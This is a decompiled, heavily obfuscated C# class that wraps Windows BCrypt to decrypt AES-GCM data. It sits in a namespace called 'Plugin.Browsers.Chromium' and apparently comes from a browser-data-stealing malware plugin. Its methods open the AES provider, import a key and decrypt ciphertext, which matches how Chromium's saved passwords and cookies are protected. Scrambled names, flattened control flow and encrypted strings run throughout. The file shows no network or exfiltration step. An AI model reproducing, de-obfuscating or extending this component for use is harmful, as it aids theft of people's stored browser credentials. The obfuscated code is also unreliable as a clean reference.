using System;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using HsZcU78F13T1yLWI1V;
using UY3BiEArlp6B4GPt9k;

namespace Plugin.Browsers.Chromium;

internal class AesGcm
{
	internal static object nimNRNmsoUNghXgdOIQ;

	[MethodImpl(MethodImplOptions.NoInlining)]
	public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
	{
		int num = 4;
		IntPtr intPtr2 = default(IntPtr);
		BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO bCRYPT_AUTHENTICATED_CIPHER_MODE_INFO = default(BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO);
		BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo = default(BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO);
		IntPtr intPtr = default(IntPtr);
		byte[] array2 = default(byte[]);
		uint num4 = default(uint);
		int pcbResult = default(int);
		int num5 = default(int);
		IntPtr hKey = default(IntPtr);
		int num7 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 5:
					BCrypt.BCryptCloseAlgorithmProvider(intPtr2, 0u);
					num2 = 1;
					if (nnG7JCmFHm1HgK7BH6T() == null)
					{
						continue;
					}
					break;
				case 2:
					bCRYPT_AUTHENTICATED_CIPHER_MODE_INFO = pPaddingInfo;
					num2 = 7;
					if (HOR9ODmtLisLfxo8bTt())
					{
						continue;
					}
					break;
				case 8:
					B41qMhcd1FTmR8GxOm0.IrTxr5idK(intPtr, B41qMhcd1FTmR8GxOm0.zf9cqydifP);
					num2 = 2;
					if (nnG7JCmFHm1HgK7BH6T() == null)
					{
						num2 = 5;
					}
					continue;
				case 4:
					intPtr2 = OpenAlgorithmProvider(BCrypt.BCRYPT_AES_ALGORITHM, BCrypt.MS_PRIMITIVE_PROVIDER, BCrypt.BCRYPT_CHAIN_MODE_GCM);
					num2 = 3;
					continue;
				case 1:
					return array2;
				case 7:
					try
					{
						byte[] array = new byte[MaxAuthTagSize(intPtr2)];
						int num3 = 0;
						if (nnG7JCmFHm1HgK7BH6T() != null)
						{
							num3 = 0;
						}
						while (true)
						{
							switch (num3)
							{
							case 1:
								throw new CryptographicException(H2csZ0cklFDmyxcpLhj.IrTxr5idK(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(2124), num4, H2csZ0cklFDmyxcpLhj.WMlc15t67x));
							case 4:
								throw new CryptographicException(nCP5vtxT3QjsSeuiK3.xuCtsHmOK(2252));
							default:
								pcbResult = 0;
								num5 = 3;
								goto IL_00eb;
							case 3:
								num4 = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref pPaddingInfo, array, array.Length, null, 0, ref pcbResult, 0);
								num3 = 7;
								if (HOR9ODmtLisLfxo8bTt())
								{
									break;
								}
								goto IL_00eb;
							case 2:
								num4 = BCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref pPaddingInfo, array, array.Length, array2, array2.Length, ref pcbResult, 0);
								num3 = 5;
								break;
							case 5:
								if (num4 != BCrypt.STATUS_AUTH_TAG_MISMATCH)
								{
									if (num4 != 0)
									{
										num3 = 0;
										if (nnG7JCmFHm1HgK7BH6T() == null)
										{
											num3 = 6;
										}
										break;
									}
									goto end_IL_00ef;
								}
								num3 = 4;
								if (HOR9ODmtLisLfxo8bTt())
								{
									break;
								}
								goto IL_00eb;
							case 7:
								if (num4 == 0)
								{
									array2 = new byte[pcbResult];
									num3 = 2;
									if (nnG7JCmFHm1HgK7BH6T() == null)
									{
										break;
									}
									goto IL_00eb;
								}
								num3 = 1;
								if (nnG7JCmFHm1HgK7BH6T() != null)
								{
									num3 = 1;
								}
								break;
							case 6:
								{
									throw new CryptographicException((string)KY5IIAmydNZiR9y2HmW(KUw8TXmDxKEuyUE5GlH(2358), num4, H2csZ0cklFDmyxcpLhj.WMlc15t67x));
								}
								IL_00eb:
								num3 = num5;
								break;
							}
							continue;
							end_IL_00ef:
							break;
						}
					}
					finally
					{
						((IDisposable)bCRYPT_AUTHENTICATED_CIPHER_MODE_INFO/*cast due to constrained. prefix*/).Dispose();
						int num6 = 0;
						if (nnG7JCmFHm1HgK7BH6T() != null)
						{
							num6 = num7;
						}
						switch (num6)
						{
						case 0:
							break;
						}
					}
					goto default;
				case 6:
					pPaddingInfo = new BCrypt.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
					num2 = 2;
					continue;
				case 3:
					intPtr = ImportKey(intPtr2, key, out hKey);
					num2 = 6;
					if (nnG7JCmFHm1HgK7BH6T() != null)
					{
						num2 = 4;
					}
					continue;
				default:
					BCrypt.BCryptDestroyKey(hKey);
					num2 = 8;
					if (HOR9ODmtLisLfxo8bTt())
					{
						continue;
					}
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private int MaxAuthTagSize(IntPtr hAlg)
	{
		int num = 1;
		int num2 = num;
		byte[] property = default(byte[]);
		while (true)
		{
			switch (num2)
			{
			default:
				return QxMcu7mnOHDLOlsnpLW(new byte[4]
				{
					property[4],
					property[5],
					property[6],
					property[7]
				}, 0, qoXFD1c9B060xd43bF6.OQAcVfb7Bl);
			case 1:
				property = GetProperty(hAlg, BCrypt.BCRYPT_AUTH_TAG_LENGTH);
				num2 = 0;
				if (HOR9ODmtLisLfxo8bTt())
				{
					num2 = 0;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
	{
		int num = 2;
		uint num3 = default(uint);
		byte[] array = default(byte[]);
		IntPtr phAlgorithm = default(IntPtr);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 4:
					if (num3 != 0)
					{
						num2 = 6;
						if (HOR9ODmtLisLfxo8bTt())
						{
							continue;
						}
						break;
					}
					array = (byte[])W2bGNxmZUTb7vIt2Pqj(gRnjGrxKdWbynd12Ef3.IrTxr5idK(gRnjGrxKdWbynd12Ef3.WIcxbkC0Bn), chainingMode, lvfeUdxdotHleo5TGFR.x5Wxq1S9FF);
					num2 = 5;
					continue;
				case 1:
					num3 = BCrypt.BCryptOpenAlgorithmProvider(out phAlgorithm, alg, provider, 0u);
					num2 = 4;
					continue;
				case 5:
					num3 = BCrypt.BCryptSetAlgorithmProperty(phAlgorithm, BCrypt.BCRYPT_CHAINING_MODE, array, array.Length, 0);
					num2 = 0;
					if (nnG7JCmFHm1HgK7BH6T() == null)
					{
						num2 = 0;
					}
					continue;
				default:
					if (num3 != 0)
					{
						num2 = 3;
						continue;
					}
					return phAlgorithm;
				case 2:
					phAlgorithm = IntPtr.Zero;
					num2 = 1;
					if (nnG7JCmFHm1HgK7BH6T() == null)
					{
						continue;
					}
					break;
				case 3:
					throw new CryptographicException((string)KY5IIAmydNZiR9y2HmW(KUw8TXmDxKEuyUE5GlH(2594), num3, H2csZ0cklFDmyxcpLhj.WMlc15t67x));
				case 6:
					throw new CryptographicException(H2csZ0cklFDmyxcpLhj.IrTxr5idK((string)KUw8TXmDxKEuyUE5GlH(2462), num3, H2csZ0cklFDmyxcpLhj.WMlc15t67x));
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
	{
		int num = 1;
		uint num4 = default(uint);
		IntPtr intPtr = default(IntPtr);
		byte[] array = default(byte[]);
		int num3 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 5:
					if (num4 != 0)
					{
						num2 = 2;
						if (HOR9ODmtLisLfxo8bTt())
						{
							continue;
						}
						break;
					}
					return intPtr;
				case 3:
					array = Concat(BCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC, (byte[])rNmvdYm7mH5jYiFGEVI(1, jDvucuu4vxeEEKLMH6.NZ5PnhYTD), jDvucuu4vxeEEKLMH6.IrTxr5idK(key.Length, jDvucuu4vxeEEKLMH6.NZ5PnhYTD), key);
					num2 = 4;
					if (HOR9ODmtLisLfxo8bTt())
					{
						num2 = 4;
					}
					continue;
				case 4:
					num4 = BCrypt.BCryptImportKey(hAlg, IntPtr.Zero, BCrypt.BCRYPT_KEY_DATA_BLOB, out hKey, intPtr, num3, array, array.Length, 0u);
					num2 = 5;
					continue;
				case 1:
					num3 = QxMcu7mnOHDLOlsnpLW(GetProperty(hAlg, BCrypt.BCRYPT_OBJECT_LENGTH), 0, qoXFD1c9B060xd43bF6.OQAcVfb7Bl);
					num2 = 0;
					if (nnG7JCmFHm1HgK7BH6T() == null)
					{
						num2 = 0;
					}
					continue;
				case 2:
					throw new CryptographicException((string)KY5IIAmydNZiR9y2HmW(KUw8TXmDxKEuyUE5GlH(2838), num4, H2csZ0cklFDmyxcpLhj.WMlc15t67x));
				default:
					intPtr = WnTbgQmuDWOsiWrKQWG(num3, OtIWfexyXB2CWuYpx8B.xTxxFyvglq);
					num2 = 3;
					if (nnG7JCmFHm1HgK7BH6T() == null)
					{
						continue;
					}
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private byte[] GetProperty(IntPtr hAlg, string name)
	{
		int num = 2;
		uint num3 = default(uint);
		byte[] array = default(byte[]);
		int pcbResult = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				default:
					num3 = BCrypt.BCryptGetProperty(hAlg, name, array, array.Length, ref pcbResult, 0u);
					num2 = 5;
					if (nnG7JCmFHm1HgK7BH6T() != null)
					{
						num2 = 2;
					}
					continue;
				case 4:
					throw new CryptographicException((string)KY5IIAmydNZiR9y2HmW(KUw8TXmDxKEuyUE5GlH(3080), num3, H2csZ0cklFDmyxcpLhj.WMlc15t67x));
				case 6:
					return array;
				case 7:
					if (num3 != 0)
					{
						num2 = 3;
						if (HOR9ODmtLisLfxo8bTt())
						{
							continue;
						}
						break;
					}
					array = new byte[pcbResult];
					num2 = 0;
					if (nnG7JCmFHm1HgK7BH6T() == null)
					{
						continue;
					}
					break;
				case 5:
					if (num3 == 0)
					{
						num = 6;
						break;
					}
					goto case 4;
				case 2:
					pcbResult = 0;
					num2 = 1;
					if (nnG7JCmFHm1HgK7BH6T() == null)
					{
						num2 = 1;
					}
					continue;
				case 1:
					num3 = BCrypt.BCryptGetProperty(hAlg, name, null, 0, ref pcbResult, 0u);
					num2 = 7;
					continue;
				case 3:
					throw new CryptographicException((string)KY5IIAmydNZiR9y2HmW(KUw8TXmDxKEuyUE5GlH(2946), num3, H2csZ0cklFDmyxcpLhj.WMlc15t67x));
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public byte[] Concat(params byte[][] arrays)
	{
		int num = 5;
		int num4 = default(int);
		byte[][] array4 = default(byte[][]);
		byte[] array3 = default(byte[]);
		byte[] array = default(byte[]);
		byte[] array2 = default(byte[]);
		int num5 = default(int);
		int num3 = default(int);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 15:
				case 22:
					if (num4 >= array4.Length)
					{
						num2 = 17;
						continue;
					}
					goto case 2;
				case 6:
					array3 = array4[num4];
					num2 = 3;
					if (nnG7JCmFHm1HgK7BH6T() != null)
					{
						num2 = 3;
					}
					continue;
				case 1:
					if (array == null)
					{
						num2 = 7;
						continue;
					}
					goto case 16;
				case 17:
					return array2;
				case 11:
				case 12:
					num4++;
					num2 = 19;
					if (nnG7JCmFHm1HgK7BH6T() == null)
					{
						continue;
					}
					break;
				case 20:
					num4 = 0;
					num2 = 0;
					if (nnG7JCmFHm1HgK7BH6T() == null)
					{
						continue;
					}
					break;
				case 9:
					array2 = new byte[num5 - 1 + 1];
					num2 = 8;
					continue;
				default:
					if (num4 >= array4.Length)
					{
						num2 = 9;
						continue;
					}
					goto case 6;
				case 4:
					array4 = arrays;
					num2 = 20;
					continue;
				case 21:
					array4 = arrays;
					num = 18;
					break;
				case 18:
					num4 = 0;
					num2 = 15;
					continue;
				case 2:
					array = array4[num4];
					num2 = 1;
					if (HOR9ODmtLisLfxo8bTt())
					{
						continue;
					}
					break;
				case 16:
					d7Sr7vmrr3dLA81PUsl(array, 0, array2, num3, array.Length, jEIqK0ciOAYXZS5sdXD.jZFcytdKgU);
					num2 = 13;
					continue;
				case 3:
					if (array3 == null)
					{
						num2 = 12;
						continue;
					}
					goto case 10;
				case 5:
					num5 = 0;
					num2 = 4;
					continue;
				case 7:
				case 14:
					num4++;
					num2 = 22;
					continue;
				case 13:
					num3 += array.Length;
					num2 = 14;
					continue;
				case 10:
					num5 += array3.Length;
					num = 11;
					break;
				case 8:
					num3 = 0;
					num2 = 17;
					if (nnG7JCmFHm1HgK7BH6T() == null)
					{
						num2 = 21;
					}
					continue;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public AesGcm()
	{
		lfxD4emGiSVeJ5abTrK();
		base._002Ector();
		int num = 0;
		if (0 == 0)
		{
			num = 0;
		}
		switch (num)
		{
		case 0:
			break;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object KUw8TXmDxKEuyUE5GlH(int P_0)
	{
		return nCP5vtxT3QjsSeuiK3.xuCtsHmOK(P_0);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object KY5IIAmydNZiR9y2HmW(object P_0, object P_1, object P_2)
	{
		return H2csZ0cklFDmyxcpLhj.IrTxr5idK((string)P_0, P_1, (H2csZ0cklFDmyxcpLhj)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static bool HOR9ODmtLisLfxo8bTt()
	{
		return nimNRNmsoUNghXgdOIQ == null;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static AesGcm nnG7JCmFHm1HgK7BH6T()
	{
		return (AesGcm)nimNRNmsoUNghXgdOIQ;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static int QxMcu7mnOHDLOlsnpLW(object P_0, int P_1, object P_2)
	{
		return qoXFD1c9B060xd43bF6.IrTxr5idK((byte[])P_0, P_1, (qoXFD1c9B060xd43bF6)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object W2bGNxmZUTb7vIt2Pqj(object P_0, object P_1, object P_2)
	{
		return lvfeUdxdotHleo5TGFR.IrTxr5idK(P_0, (string)P_1, (lvfeUdxdotHleo5TGFR)P_2);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static IntPtr WnTbgQmuDWOsiWrKQWG(int P_0, object P_1)
	{
		return OtIWfexyXB2CWuYpx8B.IrTxr5idK(P_0, (OtIWfexyXB2CWuYpx8B)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object rNmvdYm7mH5jYiFGEVI(int P_0, object P_1)
	{
		return jDvucuu4vxeEEKLMH6.IrTxr5idK(P_0, (jDvucuu4vxeEEKLMH6)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void d7Sr7vmrr3dLA81PUsl(object P_0, int P_1, object P_2, int P_3, int P_4, object P_5)
	{
		jEIqK0ciOAYXZS5sdXD.IrTxr5idK((Array)P_0, P_1, (Array)P_2, P_3, P_4, (jEIqK0ciOAYXZS5sdXD)P_5);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static void lfxD4emGiSVeJ5abTrK()
	{
		WkMgYHbfSUMGdoITRx.meR4IDkzWCCfY();
	}
}
